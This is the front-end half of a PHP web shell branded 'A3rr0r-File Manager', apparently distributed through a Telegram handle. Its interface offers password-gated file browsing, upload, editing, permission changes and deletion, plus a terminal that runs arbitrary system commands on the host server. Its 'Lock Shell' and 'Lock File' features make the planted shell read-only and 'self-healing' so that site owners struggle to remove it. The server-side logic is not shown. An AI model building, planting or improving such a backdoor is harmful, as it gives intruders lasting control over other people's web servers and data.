        .modal-content { background-color: #18181b; padding: 32px; border-radius: 12px; border: 1px solid #27272a; width: 90%; max-width: 500px; animation: modalFadeIn 0.2s ease-out; color: #fafafa; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5); }
        @keyframes modalFadeIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
        .modal-content.modal-lg { max-width: 800px; height: 85vh; display: flex; flex-direction: column; }
        .modal-title { font-size: 1.25rem; margin-bottom: 24px; font-weight: 600; color: #fafafa; letter-spacing: -0.025em; }
        .modal-form { display: flex; flex-direction: column; gap: 16px; }
        .editor-form { display: flex; flex-direction: column; gap: 16px; flex-grow: 1; }
        .form-group { display: flex; flex-direction: column; gap: 8px; }
        .form-group label { font-weight: 500; font-size: 0.875rem; color: #a1a1aa; }
        .form-group input, .form-group textarea { padding: 10px 14px; border: 1px solid #27272a; border-radius: 6px; background-color: #09090b; color: #fafafa; font-size: 0.875rem; transition: border-color 0.2s; }
        .form-group input:focus, .form-group textarea:focus { border-color: #52525b; outline: none; }
        .form-group textarea { flex-grow: 1; font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; font-size: 13px; resize: none; line-height: 1.6; }
        .modal-actions { display: flex; justify-content: flex-end; gap: 10px; margin-top: 24px; }
        .btn-cancel { background-color: transparent; color: #a1a1aa; border: 1px solid #27272a; }
        .btn-cancel:hover { background-color: #27272a; color: #fafafa; }

        /* Alerts */
        .alert { padding: 12px 16px; margin-bottom: 24px; border-radius: 8px; font-weight: 500; font-size: 0.875rem; display: flex; align-items: center; gap: 10px; }
        .alert-success { background-color: rgba(22, 163, 74, 0.1); color: #4ade80; border: 1px solid rgba(22, 163, 74, 0.2); }
        .alert-error { background-color: rgba(220, 38, 38, 0.1); color: #f87171; border: 1px solid rgba(220, 38, 38, 0.2); }
        .alert-warning { background-color: rgba(217, 119, 6, 0.1); color: #fbbf24; border: 1px solid rgba(217, 119, 6, 0.2); }

        /* Lock Buttons */
        .btn-lock-file  { background-color: #18181b; color: #fbbf24; border: 1px solid #451a03; }
        .btn-lock-file:hover  { background-color: #451a03; border-color: #78350f; }
        .btn-lock-shell { background-color: #18181b; color: #f87171; border: 1px solid #450a0a; }
        .btn-lock-shell:hover { background-color: #450a0a; border-color: #7f1d1d; }

        /* Spinner */
        .loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(9,9,11,0.8); z-index: 2000; justify-content: center; align-items: center; }
        .spinner { width: 40px; height: 40px; border: 3px solid #27272a; border-top: 3px solid #fafafa; border-radius: 50%; animation: spin 0.8s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        /* Lock badge in table */
        .lock-badge { display:inline-flex; align-items: center; gap: 4px; background-color: rgba(220, 38, 38, 0.1); color: #f87171; font-size: 0.65rem; font-weight: 600; padding: 2px 6px; border-radius: 4px; margin-left: 8px; border: 1px solid rgba(220, 38, 38, 0.2); letter-spacing: 0.05em; }
        .perm-locked { color: #f87171; font-weight: 500; display: flex; align-items: center; gap: 6px; }
        .action-btn-disabled { background: transparent; border: 1px solid transparent; font-size: 1.1rem; color: #3f3f46; width: 32px; height: 32px; display: inline-flex; align-items: center; justify-content: center; border-radius: 6px; cursor: not-allowed; }
        .btn-unlock { background-color: #18181b; color: #4ade80; border: 1px solid #052e16; font-size: 0.75rem; font-weight: 600; padding: 4px 10px; border-radius: 6px; cursor: pointer; transition: all 0.2s; display: inline-flex; align-items: center; gap: 4px; }
        .btn-unlock:hover { background-color: #052e16; border-color: #14532d; }

        /* Login screen */
        .login-container { display: flex; justify-content: center; align-items: center; min-height: 100vh; background-color: #09090b; }
        .login-box { background-color: #18181b; padding: 40px; border-radius: 12px; border: 1px solid #27272a; width: 100%; max-width: 380px; text-align: center; }
        .login-box h2 { font-size: 1.5rem; margin-bottom: 24px; font-weight: 600; color: #fafafa; letter-spacing: -0.025em; }
        .login-input { width: 100%; padding: 12px 16px; border: 1px solid #27272a; border-radius: 6px; background-color: #09090b; color: #fafafa; font-size: 0.875rem; margin-bottom: 16px; transition: border-color 0.2s; text-align: center; }
        .login-input:focus { border-color: #52525b; outline: none; }
        .login-btn { width: 100%; justify-content: center; padding: 12px; }

        @media (max-width: 768px) {
            .upload-form { flex-direction: column; align-items: stretch; }
            .section-header { flex-direction: column; align-items: flex-start; gap: 16px; }
            .btn { width: 100%; justify-content: center; }
        }
    </style>
</head>
<body>
    <?php if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true): ?>
    <div class="login-container">
        <div class="login-box">
            <h2><span class="text-red">A3rr0r</span></h2>
            <?php if (isset($login_error)): ?>
                <div class="alert alert-error"><i class="ri-error-warning-line"></i> <?php echo htmlspecialchars($login_error); ?></div>
            <?php endif; ?>
            <form method="post">
                <input type="password" name="login_pwd" class="login-input" placeholder="Password" required autofocus>
                <button type="submit" class="btn login-btn"><i class="ri-login-box-line"></i> ACCESS</button>
            </form>
        </div>
    </div>
    </body>
    </html>
    <?php exit; ?>
    <?php endif; ?>

    <div id="loadingOverlay" class="loading-overlay"><div class="spinner"></div></div>

    <nav class="navbar">
        <div class="container navbar-content">
            <h1><span style="color:#f87171;">A3rr0r</span>-File Manager <span class="version">v<?php echo X_FILE_MANAGER_VERSION; ?></span></h1>
            <div class="navbar-actions">
                <button onclick="navigateTo('<?php echo encryptPath(getcwd()); ?>')" class="home-btn">
                    <span class="home-icon"><i class="ri-home-4-line"></i></span> Home
                </button>
                <a href="?logout=1" class="home-btn logout-btn"><i class="ri-logout-box-r-line"></i>&nbsp; Logout</a>
            </div>
        </div>
    </nav>

    <div class="container">
        <!-- Top Banner -->
        <div class="top-banner">
            <span class="text-red">A3rr0r</span><span class="text-white"> - File Manager</span>
        </div>
        
        <!-- Social Line -->
        <div class="social-line">
            <a href="https://t.me/A3rr0r" target="_blank" class="social-link">
                <i class="ri-telegram-line" style="color: #a1a1aa; margin-right: 6px; font-size: 1.1rem;"></i>
                <span class="label">telegram:</span> <span class="id">@A3rr0r</span>
            </a>
        </div>

        <!-- Breadcrumbs -->
        <div class="breadcrumb">
            <i class="ri-folder-open-line" style="color: #a1a1aa; margin-right: 8px;"></i>
            <?php foreach ($breadcrumb_items as $index => $item): ?>
                <div class="breadcrumb-item">
                    <?php if ($index === count($breadcrumb_items) - 1): ?>
                        <span class="breadcrumb-current"><?php echo htmlspecialchars($item['name']); ?></span>
                    <?php else: ?>
                        <a onclick="navigateTo('<?php echo $item['path']; ?>')"><?php echo htmlspecialchars($item['name']); ?></a>
                        <span class="breadcrumb-separator">/</span>
                    <?php endif; ?>
                </div>
            <?php endforeach; ?>
        </div>

        <!-- Alerts -->
        <!-- Alerts -->
        <?php if ($message): ?><div class="alert alert-success"><i class="ri-checkbox-circle-line"></i> <?php echo $message; ?></div><?php endif; ?>
        <?php if ($error): ?><div class="alert alert-error"><i class="ri-error-warning-line"></i> <?php echo $error; ?></div><?php endif; ?>

        <!-- Upload Section -->
        <section class="section">
            <h2 class="section-title">Upload Core Files</h2>
            <form class="upload-form" method="post" enctype="multipart/form-data">
                <input type="file" name="file" required>
                <button type="submit" name="upload" class="btn"><i class="ri-upload-cloud-2-line"></i> Upload File</button>
            </form>
        </section>

        <!-- Files List Section -->
        <section class="section">
            <div class="section-header">
                <h2 class="section-title">File Explorer</h2>
                <div class="section-actions" style="display:flex;gap:8px;flex-wrap:wrap;">
                    <button class="btn btn-sm btn-lock-file"  onclick="showLockFileModal()"><i class="ri-lock-2-line"></i> Lock File</button>
                    <button class="btn btn-sm btn-lock-shell" onclick="confirmLockShell()"><i class="ri-shield-keyhole-line"></i> Lock Shell</button>
                    <button class="btn btn-sm btn-success" onclick="showCreateFileModal()"><i class="ri-file-add-line"></i> New File</button>
                    <button class="btn btn-sm" onclick="showCreateFolderModal()"><i class="ri-folder-add-line"></i> New Folder</button>
                </div>
            </div>
            <div class="file-table-container">
                <table class="file-table">
                    <thead>
                        <tr>
                            <th>Filename</th>
                            <th>Size</th>
                            <th>Permissions</th>
                            <th>Modified</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php if ($current_path !== DIRECTORY_SEPARATOR && $current_path !== substr(getcwd(), 0, 3)): ?>
                        <tr>
                            <td><div class="file-name"><i class="ri-arrow-go-back-line" style="color: #a1a1aa;"></i><a onclick="navigateTo('<?php echo encryptPath(dirname($current_path)); ?>')">.. (Parent Directory)</a></div></td>
                            <td>-</td><td>-</td><td>-</td><td>-</td>
                        </tr>
                        <?php endif; ?>
                        <?php foreach ($files as $file): ?>
                        <tr style="<?php echo $file['isLocked'] ? 'background-color:rgba(220, 38, 38, 0.05);' : ''; ?>">
                            <td>
                                <div class="file-name">
                                    <span class="<?php echo $file['isDirectory'] ? 'folder-icon' : 'file-icon'; ?>">
                                        <i class="<?php echo $file['isDirectory'] ? 'ri-folder-fill' : 'ri-file-text-line'; ?>"></i>
                                    </span>
                                    <?php if ($file['isDirectory']): ?>
                                        <a onclick="navigateTo('<?php echo $file['path']; ?>')"><?php echo htmlspecialchars($file['name']); ?></a>
                                    <?php else: ?>
                                        <span><?php echo htmlspecialchars($file['name']); ?></span>
                                        <?php if ($file['isLocked']): ?>
                                            <span class="lock-badge"><i class="ri-lock-fill"></i> LOCKED</span>
                                        <?php endif; ?>
                                    <?php endif; ?>
                                </div>
                            </td>
                            <td><?php echo $file['size']; ?></td>
                            <td class="<?php echo $file['isLocked'] ? 'perm-locked' : ''; ?>">
                                <?php if ($file['isLocked']): ?><i class="ri-lock-fill"></i> <?php endif; ?><?php echo $file['permissions']; ?>
                            </td>
                            <td><?php echo $file['lastModified']; ?></td>
                            <td>
                                <div class="action-buttons">
                                    <?php if (!$file['isDirectory']): ?>
                                        <button class="action-btn" title="Download" onclick="downloadFile('<?php echo $file['path']; ?>')"><i class="ri-download-cloud-2-line"></i></button>
                                        <?php if ($file['isEditable']): ?>
                                            <button class="action-btn" title="Edit" onclick="showEditFileModal('<?php echo $file['path']; ?>', '<?php echo addslashes($file['name']); ?>')"><i class="ri-edit-2-line"></i></button>
                                        <?php endif; ?>
                                    <?php endif; ?>
                                    <button class="action-btn" title="Rename" onclick="showRenameModal('<?php echo $file['path']; ?>', '<?php echo addslashes($file['name']); ?>')"><i class="ri-pencil-line"></i></button>

                                    <?php if ($file['isLocked']): ?>
                                        <!-- Chmod BLOCKED for locked files -->
                                        <span class="action-btn-disabled" title="LOCKED — Chmod change not allowed!"><i class="ri-key-line"></i></span>
                                    <?php else: ?>
                                        <button class="action-btn" title="Permissions" onclick="showPermissionsModal('<?php echo $file['path']; ?>', '<?php echo addslashes($file['name']); ?>')"><i class="ri-key-line"></i></button>
                                    <?php endif; ?>

                                    <?php if ($file['isLocked']): ?>
                                        <!-- Delete BLOCKED for locked files -->
                                        <span class="action-btn-disabled" title="LOCKED — Cannot delete locked file!"><i class="ri-delete-bin-line"></i></span>
                                        <!-- Unlock button — right of delete -->
                                        <form method="post" style="display:inline;" onsubmit="return confirm('Unlock this file and restore chmod 0644?');">
                                            <input type="hidden" name="unlockPath" value="<?php echo $file['path']; ?>">
                                            <button type="submit" name="unlockFile" class="btn-unlock" title="Unlock File"><i class="ri-lock-unlock-line"></i> Unlock</button>
                                        </form>
                                    <?php else: ?>
                                        <form method="post" style="display:inline;" onsubmit="return confirm('Permanently delete this <?php echo $file['isDirectory'] ? 'folder' : 'file'; ?>?');">
                                            <input type="hidden" name="path" value="<?php echo $file['path']; ?>">
                                            <button type="submit" name="delete" class="action-btn" title="Delete" style="color:#f87171;"><i class="ri-delete-bin-line"></i></button>
                                        </form>
                                    <?php endif; ?>
                                </div>
                            </td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>
        </section>

        <!-- Command Console (Terminal) -->
        <section class="terminal-container">
            <div class="terminal-header">
                <span>>_ <span style="color:#f87171;">A3rr0r</span>-terminal v<?php echo X_FILE_MANAGER_VERSION; ?></span>
                <span>Context: <?php echo htmlspecialchars($current_path); ?></span>
            </div>
            <div id="terminalOutput" class="terminal-output">Welcome to <span style="color:#f87171;">A3rr0r</span> Terminal.
All commands will be executed relative to the current directory.
Type 'help' for hints or any system command to begin.</div>
            <div class="terminal-input-group">
                <input type="text" id="terminalInput" class="terminal-input" placeholder="Enter shell command here..." autocomplete="off">
                <button onclick="executeCommand()" class="btn btn-sm btn-success"><i class="ri-terminal-line"></i> Run</button>
            </div>
        </section>
        
        <div style="height: 50px;"></div>
    </div>

    <!-- Modals -->
    <div id="renameModal" class="modal">
        <div class="modal-content">
            <h3 class="modal-title">Rename: <span id="renameFileName"></span></h3>
            <form class="modal-form" method="post">
                <input type="hidden" id="renameOldPath" name="oldPath">
                <div class="form-group">
                    <label>New Item Name</label>
                    <input type="text" id="renameNewName" name="newName" required>
                </div>
                <div class="modal-actions">
                    <button type="button" class="btn btn-cancel" onclick="hideModal('renameModal')">Cancel</button>
                    <button type="submit" name="rename" class="btn">Rename Item</button>
                </div>
            </form>
        </div>
    </div>

    <div id="permissionsModal" class="modal">
        <div class="modal-content">
            <h3 class="modal-title">Modify Permissions: <span id="permissionsFileName"></span></h3>
            <form class="modal-form" method="post">
                <input type="hidden" id="permissionsPath" name="permPath">
                <div class="form-group">
                    <label>Octal Representation (e.g., 0755 or 0644)</label>
                    <input type="text" name="permissions" placeholder="0755" required>
                </div>
                <div class="modal-actions">
                    <button type="button" class="btn btn-cancel" onclick="hideModal('permissionsModal')">Cancel</button>
                    <button type="submit" name="changePermissions" class="btn">Apply Changes</button>
                </div>
            </form>
        </div>
    </div>

    <div id="createFileModal" class="modal">
        <div class="modal-content">
            <h3 class="modal-title">Create New File</h3>
            <form class="modal-form" method="post">
                <div class="form-group">
                    <label>Filename (with extension)</label>
                    <input type="text" name="newFileName" placeholder="script.php" required>
                </div>
                <div class="modal-actions">
                    <button type="button" class="btn btn-cancel" onclick="hideModal('createFileModal')">Cancel</button>
                    <button type="submit" name="createFile" class="btn">Create File</button>
                </div>
            </form>
        </div>
    </div>

    <div id="createFolderModal" class="modal">
        <div class="modal-content">
            <h3 class="modal-title">Create New Folder</h3>
            <form class="modal-form" method="post">
                <div class="form-group">
                    <label>Folder Name</label>
                    <input type="text" name="newFolderName" placeholder="assets" required>
                </div>
                <div class="modal-actions">
                    <button type="button" class="btn btn-cancel" onclick="hideModal('createFolderModal')">Cancel</button>
                    <button type="submit" name="createFolder" class="btn">Create Folder</button>
                </div>
            </form>
        </div>
    </div>

    <!-- Lock File Modal -->
    <div id="lockFileModal" class="modal">
        <div class="modal-content">
            <h3 class="modal-title">🔒 Lock File</h3>
            <p style="margin-bottom:15px;color:#555;font-size:.95rem;">Enter the full path of the file you want to lock (read-only + self-healing handler).</p>
            <form class="modal-form" method="post">
                <div class="form-group">
                    <label>File Path (absolute or relative)</label>
                    <input type="text" name="lockFilePath" id="lockFilePathInput" placeholder="/var/www/html/shell.php" required>
                    <input type="hidden" name="lockFile" value="1">
                </div>
                <div class="modal-actions">
                    <button type="button" class="btn btn-cancel" onclick="hideModal('lockFileModal')">Cancel</button>
                    <button type="submit" class="btn btn-lock-file">🔒 Activate Lock</button>
                </div>
            </form>
        </div>
    </div>

    <!-- Lock Shell Modal (confirmation) -->
    <div id="lockShellModal" class="modal">
        <div class="modal-content">
            <h3 class="modal-title">🛡️ Lock Shell</h3>
            <p style="margin-bottom:15px;color:#555;font-size:.95rem;">Lock <strong>this shell file itself</strong> (<code><?php echo basename(__FILE__); ?></code>) so it becomes read-only and self-healing.</p>
            <form class="modal-form" method="post">
                <input type="hidden" name="lockShell" value="1">
                <div class="modal-actions">
                    <button type="button" class="btn btn-cancel" onclick="hideModal('lockShellModal')">Cancel</button>
                    <button type="submit" class="btn btn-lock-shell">🛡️ Yes, Lock This Shell</button>
                </div>
            </form>
        </div>
    </div>

    <div id="editFileModal" class="modal">
        <div class="modal-content modal-lg">
            <h3 class="modal-title">Editor: <span id="editFileName"></span></h3>
            <form class="editor-form" method="post">
                <input type="hidden" id="editFilePath" name="filePath">
                <div class="form-group" style="flex-grow:1; display:flex; flex-direction:column;">
                    <textarea id="fileContent" name="fileContent" required></textarea>
                </div>
                <div class="modal-actions">
                    <button type="button" class="btn btn-cancel" onclick="hideModal('editFileModal')">Cancel</button>
                    <button type="submit" name="saveFile" class="btn">Save Changes</button>
                </div>
            </form>
        </div>
    </div>

    <!-- Hidden forms for JS -->
    <form id="navigationForm" method="post" style="display:none;"><input type="hidden" name="action" value="navigate"><input type="hidden" id="navigationPath" name="path"></form>
    <form id="downloadForm" method="post" style="display:none;"><input type="hidden" name="action" value="download"><input type="hidden" id="downloadPath" name="path"></form>

    <script>
        function showLoading() { document.getElementById('loadingOverlay').style.display = 'flex'; }
        function hideLoading() { document.getElementById('loadingOverlay').style.display = 'none'; }
        
        // Navigation helper that preserves the key in the URL
        function navigateTo(path) { 
            showLoading(); 
            document.getElementById('navigationPath').value = path;
            const form = document.getElementById('navigationForm');
            form.submit(); 
        }

        function downloadFile(path) { 
            const form = document.getElementById('downloadForm');
            document.getElementById('downloadPath').value = path; 
            form.submit(); 
        }

        function hideModal(id) { document.getElementById(id).style.display = 'none'; }
        
        function showRenameModal(path, name) {
            document.getElementById('renameFileName').textContent = name;
            document.getElementById('renameOldPath').value = path;
            document.getElementById('renameNewName').value = name;
            document.getElementById('renameModal').style.display = 'flex';
        }

        function showPermissionsModal(path, name) {
            document.getElementById('permissionsFileName').textContent = name;
            document.getElementById('permissionsPath').value = path;
            document.getElementById('permissionsModal').style.display = 'flex';
        }

        function showCreateFileModal() { document.getElementById('createFileModal').style.display = 'flex'; }
        function showCreateFolderModal() { document.getElementById('createFolderModal').style.display = 'flex'; }

        // Lock File – pre-fill with current path
        function showLockFileModal() {
            document.getElementById('lockFilePathInput').value = '';
            document.getElementById('lockFileModal').style.display = 'flex';
        }

        // Lock Shell – show confirmation modal
        function confirmLockShell() {
            document.getElementById('lockShellModal').style.display = 'flex';
        }

        function showEditFileModal(path, name) {
            document.getElementById('editFileName').textContent = name;
            document.getElementById('editFilePath').value = path;
            showLoading();
            const formData = new FormData();
            formData.append('action', 'getContent');
            formData.append('path', path);
            fetch(window.location.href, { method: 'POST', body: formData })
            .then(r => r.text())
            .then(content => {
                document.getElementById('fileContent').value = content;
                document.getElementById('editFileModal').style.display = 'flex';
                hideLoading();
            }).catch(e => { hideLoading(); alert('Error loading file: ' + e); });
        }

        // Terminal Functionality
        function executeCommand() {
            const cmd = document.getElementById('terminalInput').value;
            if (!cmd) return;
            
            const outputBox = document.getElementById('terminalOutput');
            const timestamp = new Date().toLocaleTimeString();
            outputBox.textContent += `\n[${timestamp}] $ ${cmd}\n`;
            outputBox.scrollTop = outputBox.scrollHeight;
            
            const formData = new FormData();
            formData.append('action', 'executeCommand');
            formData.append('command', cmd);
            
            document.getElementById('terminalInput').value = '';
            
            fetch(window.location.href, { method: 'POST', body: formData })
            .then(r => r.text())
            .then(res => {
                outputBox.textContent += res + '\n';
                outputBox.scrollTop = outputBox.scrollHeight;
            })
            .catch(e => {
                outputBox.textContent += 'Execution Error: ' + e + '\n';
                outputBox.scrollTop = outputBox.scrollHeight;
            });
        }

        // Handle Enter key in terminal
        document.getElementById('terminalInput').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') executeCommand();
        });

        // Global form submission loader
        document.querySelectorAll('form').forEach(f => {
            f.addEventListener('submit', () => {
                if (f.id !== 'navigationForm' && f.id !== 'downloadForm') showLoading();
            });
        });
        
        // Modal click-outside to close
        window.onclick = function(event) {
            if (event.target.className === 'modal') {
                event.target.style.display = 'none';
            }
        }
    </script>
</body>
</html>
